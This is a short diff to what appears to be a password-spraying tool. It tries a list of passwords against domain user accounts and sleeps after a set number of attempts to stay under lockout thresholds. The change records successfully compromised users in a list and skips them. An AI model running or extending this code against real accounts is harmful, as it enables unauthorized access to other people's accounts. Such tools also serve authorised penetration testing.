@@ -75,6 +75,7 @@ if ans != totalAttacks:
     exit(Fore.MAGENTA + f'Quitting, make up your mind!' + Fore.RESET)
 
 atmptCount = 0
+successfulUsers = []
 
 logging.debug(f'Lockout number is {args.Lockout} and type {type(args.Lockout)}')
 
@@ -83,9 +84,11 @@ for pwd in passwords:
     t = localtime()
     print(f'[{asctime(t)}]-' + Fore.BLUE + f'[*] Attempting password {pwd}')
     for user in users:
+        if user in successfulUsers:
+            continue
         if authAttempt(args.Server, args.Domain, user, pwd) == True:
-            logging.debug(f'Successful authentication. Removing username {user} from users list')
-            users.remove(user)
+            logging.debug(f'Successful authentication. Adding username {user} to successfulUsers list')
+            successfulUsers.append(user)
     atmptCount += 1
     if atmptCount >= args.Lockout:
         print(f'[{asctime(t)}]-' + Fore.YELLOW + f'[*] Hit attempt count of {args.Lockout}, sleeping for {args.Window} minutes')
